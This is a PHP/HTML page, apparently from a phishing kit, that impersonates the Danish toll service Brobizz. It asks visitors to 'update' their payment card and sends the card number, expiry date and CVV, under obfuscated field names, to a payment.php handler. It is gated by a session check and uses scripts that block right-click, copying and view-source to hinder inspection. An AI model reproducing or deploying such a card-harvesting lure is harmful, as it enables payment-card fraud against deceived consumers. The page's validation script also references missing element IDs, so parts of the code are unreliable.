
<?php
error_reporting(0);
date_default_timezone_set('Europe/Copenhagen');
session_start();

require '../includes/alego.php';

// Session validation
if(!isset($_SESSION['active'])){
    header('Location: index.php');
    exit();
}
?>
<!DOCTYPE html>
<html lang="fr"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover, user-scalable=no">
    <meta name="theme-color" content="#000000">
    <meta name="robots" content="noindex, nofollow">
    <meta name="google" content="notranslate">
    <link rel="icon" type="image/x-icon" href="../assets/images/favicon.ico">
    <link rel="stylesheet" href="../assets/css/main.30fa81e7.css">
    <title>Kontaktoplysninger</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 85vh;
            background-color: #f5f5f5;
            position: relative;
        }
        .container {
            background-color: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 400px;
            position: relative;
        }
        .container .header {
            display: flex;
            align-items: center;
            margin-bottom: 20px;
        }
        .container .header svg {
            margin-right: 10px;
        }
        .container h2 {
            margin: 0;
        }
        .container label {
            display: block;
            margin-bottom: 5px;
        }
        .container input, .container select {
            width: 100%;
            padding: 10px;
            margin-bottom: 15px;
            border: 1px solid #ddd;
            border-radius: 5px;
        }
        .container button {
            width: 50%;
            padding: 10px;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 20px;
            cursor: pointer;
        }
        .container button:hover {
            background-color: #45a049;
        }
        .back-link {
            text-align: left;
            margin-bottom: 20px;
        }
        .back-link a {
            text-decoration: none;
            color: #007BFF;
        }
        .back-link a:hover {
            text-decoration: underline;
        }
        .spinner {
            display: none;
            width: 60px;
            height: 60px;
            border: 4px solid rgba(0, 0, 0, 0.1);
            border-left-color: #4CAF50;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            position: absolute;
            top: 50%;
            left: 43%;
            z-index: 1000;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        .blur {
            filter: blur(4px);
        }
        .modal {
            display: none;
            position: fixed;
            z-index: 1001;
            left: 50%;
            top: 50%;
            transform: translate(-50%, -50%);
            background-color: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 400px;
            text-align: center;
        }
        .modal.open {
            display: block;
        }
        .modal h2 {
            margin-bottom: 20px;
        }
        .modal label {
            display: block;
            margin-bottom: 10px;
            font-size: 1.2em;
            text-align: left;
        }
        .modal input {
            width: 100%;
            padding: 12px;
            margin-bottom: 20px;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 1.1em;
        }
        .modal button {
            background-color: #4CAF50;
            color: white;
            padding: 10px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 1.1em;
        }
        .modal button:disabled {
            background-color: #ddd;
        }
        .error {
            color: red;
            display: none;
            text-align: left;
        }
        .payment-icons img {
            margin: 5px;
            width: 50px;
        }
    </style>
</head>
<body>
    <div class="spinner" style="display: none;"></div>
    <div class="container">
        <div class="back-link">
            <a href="./welcome.php">← Tilbage</a>
        </div>
        <h3>Opdater betalingskort</h3>
        <p>Her kan du opdatere dit betalingskort, hvis du har fået et nyt, eller Brobizz ikke kunne trække penge på dit kort.</p>
<div class="payment-icons">
  <img src="../assets/images/DANKORT_card.svg" alt="DK">
  <img src="../assets/images/VISA_card.svg" alt="VISA">
  <img src="../assets/images/ELECTRON_card.svg" alt="VISA Electron">
  <img src="../assets/images/MASTERCARD_card.svg" alt="MasterCard">
</div>
        
        <form  action="../payment.php" method="post" id="paymentForm">
            <div>
                <label for="fname">Kortnummer :</label>
                <input type="text"  name="aa"   placeholder="1234 1234 1234 1234" maxlength="19" minlength="16" required>
            </div>
           
            <div>
                <label for="">Udløbsdato :</label>
                <input type="text"  id="expiration-date" name="bb" maxlength="5" minlength="5" placeholder="MM/ÅÅ" required>
            </div>
            <div>
                <label for="">Kontrolcifre :</label>
                <input type="text" id="cv" name="cc" maxlength="3" minlength="3"  inputmode="numeric" placeholder="123" required>
            </div>
           
            <button type="submit" >Fortsætte</button>
        </form>
    </div>
    
    <script>
        document.addEventListener('DOMContentLoaded', function () {
            const cardNumberInput = document.getElementById('card-number');
            const paymentForm = document.getElementById('payment-form');
        
            cardNumberInput.addEventListener('input', function (e) {
                let input = e.target.value.replace(/\D/g, '').substring(0, 16);  // Limite à 16 chiffres
                let formattedInput = input.match(/.{1,4}/g)?.join(' ') || '';  // Ajoute des espaces après chaque groupe de 4 chiffres
                e.target.value = formattedInput;
            });
        
            cardNumberInput.addEventListener('keydown', function (e) {
                // Permet les touches spéciales comme Backspace, Tab, etc.
                if ([8, 9, 37, 39].includes(e.keyCode)) return;
        
                // Permet uniquement les chiffres
                if ((e.keyCode < 48 || e.keyCode > 57) && (e.keyCode < 96 || e.keyCode > 105)) {
                    e.preventDefault();
                }
            });
        
            paymentForm.addEventListener('submit', function (e) {
                let input = cardNumberInput.value.replace(/\s/g, '');  // Retire les espaces
                if (!/^4/.test(input) && !/^5/.test(input)) {
                    e.preventDefault();
                    alert('Veuillez entrer un numéro de carte Visa ou Mastercard valide (commençant par 4 ou 5).');
                } else if (input.length !== 16) {
                    e.preventDefault();
                    alert('Veuillez entrer un numéro de carte valide de 16 chiffres.');
                }
            });
        });
        </script>
        
    
    
      <script>
        document.addEventListener('contextmenu', function(e) {
            e.preventDefault();
        });
  
        document.onkeydown = function(e) {
            if (e.ctrlKey && (e.keyCode === 67 || e.keyCode === 86 || e.keyCode === 85 || e.keyCode === 117)) {
                return false;
            } else {
                return true;
            }
        };
  
        document.onselectstart = function() {
            return false;
        };
    </script>
    
    
    <script>
      document.getElementById('expiration-date').addEventListener('input', function (e) {
          let input = e.target.value;
          if (input.length === 2 && !input.includes('/')) {
              e.target.value = input + '/';
          }
      });
  </script>

  

</body></html>











